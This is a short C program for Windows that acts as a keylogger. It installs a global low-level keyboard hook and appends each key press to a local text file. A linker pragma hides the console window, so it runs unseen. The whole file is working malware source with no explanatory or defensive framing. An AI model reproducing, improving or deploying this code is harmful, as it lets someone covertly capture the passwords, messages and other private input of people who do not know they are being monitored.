#include <stdio.h>//Input and output
#include <windows.h>//Win32API
#pragma warning(disable:4996)
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") 
FILE* OUTPUT_FILE;
char FILE_NAME[] = "windowsapiSUCKS.txt"; 
LRESULT CALLBACK LowLevelKeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
	if (nCode == HC_ACTION) {
		switch (wParam) {
		case WM_KEYDOWN: {
			PKBDLLHOOKSTRUCT KeyInfo = (PKBDLLHOOKSTRUCT)lParam;
			OUTPUT_FILE = fopen(FILE_NAME, "a");
			fprintf(OUTPUT_FILE, "%c", KeyInfo->vkCode);
			fclose(OUTPUT_FILE);
		}
		default: break;
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);

};
int main() {
	HHOOK Hook=SetWindowsHookEx(
		WH_KEYBOARD_LL,
		LowLevelKeyboardProc,
		NULL,
		0
	);
	MSG Message_Info;
	while(GetMessage(&Message_Info, NULL, 0, 0) != 0);
}